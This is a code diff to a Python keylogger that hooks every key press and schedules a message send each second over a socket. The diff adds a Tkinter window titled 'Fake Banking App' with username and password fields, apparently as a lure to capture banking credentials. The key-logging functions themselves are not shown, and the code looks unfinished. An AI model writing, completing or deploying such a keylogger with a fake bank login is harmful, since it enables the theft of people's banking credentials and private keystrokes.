@@ -2,6 +2,10 @@ import keyboard
 import socket
 import schedule
 import time
+from tkinter import *
+from tkinter import ttk
+from PIL import Image, ImageTk
+
 
 def keyPress(event):
 
@@ -58,21 +62,44 @@ def sendMessage():
 
 def main():
 
-    log = open("KeyLog.txt", 'w')
+    # Creating window for app
+    root = Tk()
+    root.title("Fake Banking App")
+    root.maxsize(900, 600)
+
+    #Setting up the title box and image in box
+    img = Image.open("fakebankicon.jpg")
+    image = ImageTk.PhotoImage(img)
+    Label(root, image=image).pack()
+    
+    #Set up window for username
+    username_frame = Frame(root, bg='grey')
+    username_frame.pack()
+    Label(username_frame, text="Username", bg='white').pack(side='left', padx=5)
+    username_entry= Entry(username_frame, bd=3)
+    username_entry.pack(side='right')
+   
+    #Setup window for password
+    password_frame = Frame(root, bg='grey')
+    password_frame.pack()
+    Label(password_frame, text="Password", bg='white').pack(side='left', padx=7)
+    password_entry= Entry(password_frame, bd=3)
+    password_entry.pack(side='right')
+
+
+    root.mainloop()
+
+
 
     keyboard.on_press(keyPress)
-    #Send log file every day?  Needs function for that
+    #Send log file every day?  Needs function for that?
     schedule.every(1).seconds.do(sendMessage)
     
 
     while True:
         schedule.run_pending()
         time.sleep(1)
-        
-    
-    #KEYBOARD.WAIT NEEDS WORK FOR SURE IT PAUSES THE PROGRAM.  NEED
-    #TO LOOK INTO THIS
-    #keyboard.wait()
+
    
 if __name__ == "__main__":
     main()
